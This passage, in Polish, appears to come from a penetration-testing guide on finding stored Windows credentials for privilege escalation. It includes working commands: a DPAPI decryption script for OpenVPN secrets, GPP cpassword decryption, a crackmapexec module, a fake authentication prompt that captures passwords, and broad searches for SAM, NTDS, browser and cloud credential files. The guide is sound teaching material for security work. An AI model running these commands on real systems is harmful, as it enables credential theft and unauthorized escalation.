Serwer CI może zachować przesłane zmiany w kodzie źródłowym w swoim katalogu danych nawet po zakończeniu kompilacji. [TeamCity dokumentuje](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) katalog `system/changes` jako miejsce przechowywania zmian zdalnych; katalog danych można skonfigurować i nie musi się on znajdować w `ProgramData`. Czytelna poprawka może zachować usunięte lub dodane odwołania do pliku poświadczeń, klucza szyfrowania albo skryptu, który używa obu tych elementów. Na przykład procedura PowerShell wykorzystująca `ConvertTo-SecureString -Key` wymaga zarówno klucza AES, jak i zaszyfrowanego ciągu; [Microsoft dokumentuje](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), że klucz jest dostarczany osobno. Najpierw sprawdzaj wyłącznie nazwy dostępnych poprawek, a następnie, działając z odpowiednimi uprawnieniami, analizuj istotną zawartość bez wyświetlania sekretów w rutynowych wynikach enumeracji. Sama ścieżka poprawki, zaszyfrowana wartość ani odwołanie do klucza nie dowodzą, że poświadczenie jest prawidłowe lub umożliwia dostęp z wyższymi uprawnieniami. Ogranicz uprawnienia ACL do katalogu danych i unikaj umieszczania sekretów w zmianach kodu kompilacji.

### Niestandardowa rotacja hasła lokalnego administratora

Własny mechanizm rotacji haseł może przechowywać zaszyfrowane hasło lokalnego administratora w lokalnej usłudze, a dane uwierzytelniające do magazynu danych — w czytelnym pliku `.env` lub obok pliku binarnego aktualizatora. Analizuj razem zaplanowane zadanie aktualizatora, jego konto, uprawnienia ACL konfiguracji, nasłuchujący proces oraz uprawnienia do magazynu danych. Magazyn danych nasłuchujący wyłącznie na loopback nadal jest osiągalny dla lokalnego użytkownika mającego prawidłowe poświadczenia, ale samo uwierzytelnienie nie dowodzi uprawnień do odczytu odpowiednich rekordów. Jeśli materiał inicjujący szyfrowanie lub klucz jest dostępny obok szyfrogramu, przed zaufaniem szyfrowaniu sprawdź dokładny sposób wyprowadzania klucza. Schemat deterministycznie wyprowadzający klucz AES z ujawnionego materiału inicjującego za pomocą Go [`math/rand`](https://pkg.go.dev/math/rand) nie nadaje się do ochrony tego hasła; dokumentacja Go wskazuje, że ten pakiet nie jest odpowiedni do losowości w zastosowaniach wrażliwych z punktu widzenia bezpieczeństwa. Zanim uznasz odzyskane hasło za ścieżkę eskalacji uprawnień, potwierdź, że jest aktualne i należy do konta należącego do lokalnej grupy Administrators. Samo zaplanowane zadanie, ścieżka `.env` ani zaszyfrowany blok danych nie dowodzą żadnego z tych warunków. Nie umieszczaj haseł ani materiału kluczowego w rutynowych wynikach enumeracji.

Do zarządzania hasłami lokalnych administratorów używaj [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview). Przechowywanie w katalogu lub Entra oraz mechanizmy kontroli dostępu różnią się od niestandardowego lokalnego magazynu danych; podobnie [role Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) określają, czy uwierzytelniony użytkownik magazynu danych może odczytać konkretny indeks.

### Archiwa pluginów serwera Java i ponowne użycie poświadczeń

Niektóre pluginy serwerów Java są dystrybuowane jako archiwa JAR w katalogu `plugins` serwera. Czytelny niestandardowy plugin może zawierać konfigurację lub bytecode z osadzonym poświadczeniem usługi. Analizuj archiwum wyłącznie za odpowiednim upoważnieniem i nie umieszczaj odzyskanych sekretów w rutynowych wynikach enumeracji. Sama ścieżka do pluginu nie dowodzi, że sekret istnieje, a odzyskane hasło usługi prowadzi do wyższych uprawnień tylko wtedy, gdy jest również prawidłowe dla konta o wyższych uprawnieniach. Sprawdź odpowiednie uprawnienia ACL do plików i zastąp ponownie używane poświadczenia unikatowymi sekretami. Informacje o układzie katalogów znajdziesz w [instrukcji instalacji pluginów PaperMC](https://docs.papermc.io/paper/adding-plugins/), a o zawartości archiwów — w [dokumentacji JAR Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Poświadczenia wbudowanej bazy danych Openfire

Instalacja Openfire korzystająca z wbudowanej bazy danych może przechowywać plik `openfire.script` w katalogu `Openfire\embedded-db`. Jeśli bieżące konto może go odczytać, sprawdź razem rekordy `OFUSER` i właściwość `passwordKey`. [Dokumentacja dostawcy Openfire dotycząca dostawcy użytkowników](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) informuje, że hasła mogą być przechowywane w postaci jawnej lub szyfrowane za pomocą klucza zapisanego w tej właściwości. Odzyskane hasło ma znaczenie dla eskalacji uprawnień tylko wtedy, gdy nadal jest prawidłowe dla tożsamości o wyższych uprawnieniach; sama nazwa pliku nie dowodzi ani dostępu do odczytu, ani ponownego użycia poświadczeń. Ścieżka jest wskazówką inwentaryzacyjną, dlatego nie umieszczaj zawartości bazy danych ani poświadczeń w rutynowych wynikach enumeracji.

Osobny plik `Openfire\conf\openfire.xml` może ujawniać skonfigurowane porty i interfejs nasłuchu konsoli administracyjnej, nawet jeśli używana jest zewnętrzna baza danych. Openfire zazwyczaj nasłuchuje na loopback na potrzeby konsoli administracyjnej; lokalne konto nadal może połączyć się z tym adresem, jeśli nasłuchujący proces działa. Sprawdź razem faktyczny nasłuch, uprawnioną rolę administratora, zasady przesyłania pluginów oraz tożsamość usługi Openfire. Administrator mogący zainstalować plugin może spowodować uruchomienie jego kodu w kontekście usługi, który może mieć wysokie uprawnienia, jeśli usługa działa jako LocalSystem. Zgodne hasło konta ani czytelna ścieżka konfiguracji same w sobie nie dowodzą dostępu do konsoli administracyjnej ani możliwości wykonania kodu. Zobacz [instrukcję instalacji i zarządzania pluginami dostawcy](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania pluginów](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera zarządzania danymi forensic

Konfiguracje serwera Velociraptor, zazwyczaj nazwane `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego CA. Jeśli użytkownik o niższych uprawnieniach może odczytać ten klucz, może być w stanie wygenerować certyfikat klienta API. To, czy prowadzi to do wyższych uprawnień, zależy od ról użytkowników serwera, dostępności API oraz tożsamości, w której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne dane; znalezienie jej nie oznacza dostępu do CA serwera. W niektórych wdrożeniach prywatny klucz CA jest przechowywany offline, dlatego czytelna konfiguracja serwera może nie zawierać klucza podpisującego.

Na serwerze Windows sprawdź uprawnienia ACL do konfiguracji **serwera** w jego katalogu instalacyjnym oraz wszelkich chronionych kopii zapasowych. Jedną z możliwych lokalizacji jest `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli skonfigurowana ścieżka usługi jest inna, użyj jej. Potwierdź, że bieżąca tożsamość może odczytać plik i że faktycznie znajduje się w nim `CA.private_key`. Unikaj umieszczania klucza prywatnego w logach lub wynikach enumeracji. Procedura dostawcy `config api_client` używa klucza CA do wydania certyfikatu klienta, ale potrzebna jest również odpowiednia rola po stronie serwera; jej utworzenie lub zmiana może wymagać uprawnień do zapisu w magazynie danych albo ponownego uruchomienia. Istniejąca uprzywilejowana tożsamość serwera może zapewnić ścieżkę dostępu nawet wtedy, gdy taki zapis jest niemożliwy. Zapytania API z uprawnieniami do wykonywania kodu działają w odpowiednim kontekście serwera lub agenta, który może mieć wysokie uprawnienia.

Chroń konfigurację serwera i kopie zapasowe za pomocą restrykcyjnych uprawnień ACL, w miarę możliwości przechowuj klucz podpisujący CA offline oraz ogranicz role API i dostęp do nasłuchujących usług. Zobacz [dokumentację API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) i [wskazówki dotyczące konfiguracji zabezpieczeń](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY to osobny menedżer sesji. Jego natywny zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, natomiast wyeksportowana kopia zapasowa sesji może nosić nazwę `sessions-backup.dat` i być przechowywana w innym miejscu. [Przewodnik SolarWinds dotyczący eksportu](https://thwack.solarwinds.com/discussion/comment/115591) informuje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi oraz powiązania; na [forum pomocy technicznej](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazano natywny magazyn. Najpierw sprawdź uprawnienia do plików i ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia jego hasła ani nie dowodzi, że zapisane poświadczenia są nadal ważne lub zapewniają wyższe uprawnienia.

### Klucze hostów SSH PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, dlatego warto sprawdzić, czy znajduje się tam coś interesującego:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli znajdziesz jakikolwiek wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest zaszyfrowany, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie przy starcie systemu, wykonaj:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika nie jest już aktualna. Próbowałem utworzyć klucze SSH, dodać je za pomocą `ssh-add` i zalogować się przez SSH na komputer. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki nienadzorowane

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz również wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowych Windows Imaging (`.wim`) mogą również zawierać offline’owe ule `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdzaj lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed wyodrębnieniem czegokolwiek przejrzyj **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że zawiera on ule, a typowe obrazy `install.wim`, `boot.wim` i obrazy odzyskiwania często okazują się fałszywymi tropami. Udział SMB to osobna ścieżka dostępu — sprawdzaj go tylko wtedy, gdy mieści się w zakresie. Zobacz [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) oraz [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Poświadczenia w chmurze

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Cached GPP Password

Wcześniej dostępna była funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pomocą Group Policy Preferences (GPP). Ta metoda miała jednak poważne wady związane z bezpieczeństwem. Po pierwsze, obiekty Group Policy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, szyfrowane algorytmem AES256 przy użyciu publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to zagrożenie, opracowano funkcję, która skanuje lokalnie buforowane pliki GPP w poszukiwaniu niepustego pola „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt ten zawiera informacje o GPP i lokalizacji pliku, co ułatwia identyfikację i usunięcie tej luki w zabezpieczeniach.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (w wersjach wcześniejszych niż Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Używanie crackmapexec do uzyskiwania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Konfiguracja Web w IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config zawierającego dane uwierzytelniające:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w katalogu głównym witryny IIS

Stare archiwum ZIP umieszczone bezpośrednio w katalogu głównym witryny obsługiwanym przez serwer może ujawniać wcześniejsze pliki konfiguracyjne i dane uwierzytelniające, których można ponownie użyć. Sprawdź skonfigurowaną ścieżkę fizyczną witryny i upewnij się, czy archiwum jest rzeczywiście dostępne przez HTTP, zanim uznasz to za narażenie. Domyślna ścieżka `C:\inetpub\wwwroot` to tylko jedna z możliwości. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie dowodzi, że zawiera ono sekret ani że odzyskane dane uwierzytelniające zapewniają wyższe uprawnienia.

### Dane uwierzytelniające OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dzienniki

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o dane uwierzytelniające

Zawsze możesz **poprosić użytkownika o podanie jego danych uwierzytelniających lub nawet danych innego użytkownika**, jeśli uważasz, że może je znać (pamiętaj, że bezpośrednie **proszenie** klienta o **dane uwierzytelniające** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** zapisane **jawnym tekstem** lub w formacie Base64

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Wariant listy nazw plików bez rozszerzenia Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy danych Password Safe v3 zwykle używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako potencjalny zaszyfrowany sejf; jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć zapisanych w nim poświadczeń. Podczas sprawdzania, gdzie przechowywane są takie pliki, sprawdź dostępne profile użytkowników i skonfigurowane lokalizacje udostępniania plików.

Czytelny plik KeePass `.kdbx` również jest tylko wskazówką prowadzącą do zaszyfrowanego sejfu. Do jego odblokowania potrzebne jest właściwe hasło główne oraz wszelkie skonfigurowane pliki kluczy lub inne czynniki uwierzytelniające. Jeśli podczas autoryzowanego przeglądu znajdziesz wpis zawierający parę hashy LM:NT, zweryfikuj wskazane konto oraz to, czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Sam wpis w sejfie nie zapewnia uprawnień Administrator ani SYSTEM; wymagane są również dostęp do usługi zdalnej, odpowiednie uprawnienia konta i ewentualny odrębny etap uruchomienia usługi. Inwentaryzacja powinna odnotowywać ścieżkę do sejfu i możliwość jego odczytu, a nie wyświetlać bazy danych ani zapisanych poświadczeń.

Przeszukaj wszystkie proponowane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Wariant polecenia wyszukiwania bez rozszerzenia Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Dane uwierzytelniające w Koszu

Warto też sprawdzić Kosz w poszukiwaniu zapisanych w nim danych uwierzytelniających.

Sprawdź dostępne wpisy Kosza pod kątem usuniętych kopii zapasowych i archiwów konfiguracji, a także plików, których nazwy wprost wspominają o danych uwierzytelniających. Przydatna kopia zapasowa `.7z`, `.zip` lub `.rar` może mieć kilka miesięcy i zwyczajną nazwę. System Windows przechowuje oryginalną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako odpowiadający mu wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącej tożsamości do odczytu. Widoczność zależy od woluminu, SID użytkownika i uprawnień do plików, więc pusta lista nie dowodzi, że nie ma żadnej możliwej do odzyskania kopii zapasowej. Traktuj nazwę archiwum jako kandydat do sprawdzenia, a nie dowód, że zawiera prawidłowy sekret.

Dostępny usunięty plik `.pfx` może też być wskazówką dotyczącą **podpisywania kodu**. Jeśli zawiera dostępny klucz prywatny, można nim podpisać zmodyfikowany skrypt PowerShell; [PowerShell wymaga certyfikatu do podpisywania kodu z kluczem prywatnym](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker oceniają tożsamość podpisującego i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie skryptu na koncie innego użytkownika wymaga, by bieżąca tożsamość mogła zmodyfikować konkretny skrypt, obowiązująca reguła akceptowała uzyskany podpis dla tego skryptu i docelowego konta, a zadanie zaplanowane lub inny proces o wyższych uprawnieniach faktycznie go uruchamiał. Sama nazwa pliku `.pfx`, podmiot certyfikatu lub skrypt z prawem zapisu nie dowodzą, że ten łańcuch działa. Przed otwarciem materiałów z kluczem prywatnym lub uruchomieniem zadania sprawdź metadane, ACL, zasady i zaplanowane polecenie.

Sprawdź też dostępne bazy profili klientów komunikacyjnych, notatki i odebrane pliki w poszukiwaniu wskazówek dotyczących danych uwierzytelniających. Eksport klucza odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem w archiwum kopii zapasowej o opisowej nazwie. Takie materiały mogą zapewnić dostęp do osobnego zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum tylko wtedy, gdy masz do tego upoważnienie. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie danych uwierzytelniających domeny w trybie offline wymaga również pasującego ula `SYSTEM`, zgodnie z opisem w [procedurze dotyczącej kopii zapasowych i grup uprzywilejowanych](../active-directory-methodology/privileged-groups-and-token-privileges.md). Same nazwy plików i zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania lub kopia zapasowa domeny.

Aby **odzyskać hasła** zapisane przez kilka programów, możesz użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Wyodrębnianie kluczy openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarki

Sprawdź bazy danych, w których mogą być przechowywane hasła z **Chrome lub Firefox**.\
Sprawdź bazy danych, w których mogą być przechowywane hasła z **Chrome, Edge lub Firefox**.\
Sprawdź też historię, zakładki i ulubione przeglądarek — być może przechowywane są tam **hasła**.

W przypadku standardowego profilu Edge **Default** bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a plik `Local State` w nadrzędnym katalogu `User Data`. [Microsoft opisuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasada `UserDataDir` mogą zmienić tę lokalizację. Sama obecność pliku wskazuje jedynie potencjalny magazyn poświadczeń: potwierdź, że pliki są czytelne, sprawdź kontekst DPAPI właściwego użytkownika lub inne autoryzowane materiały klucza oraz ustal, czy zapisany login należy do konta o wyższych uprawnieniach. Samo wyliczenie ścieżek nie musi otwierać bazy danych ani wyświetlać odszyfrowanych haseł.

W przypadku Firefoksa [Mozilla opisuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu są sparowanymi plikami klucza i zaszyfrowanych loginów. Ich obecność wskazuje jedynie potencjalne źródło: sprawdź, czy oba pliki są czytelne, czy zawierają zapisane wpisy oraz czy klucz jest chroniony hasłem głównym, zanim uznasz, że poświadczenia można wykorzystać. Jeśli odzyskane poświadczenie należy do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do kontrolowania grup oraz uprawnienia grupy do [odczytu lub odszyfrowywania haseł LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie wskazują ścieżki do uzyskania uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

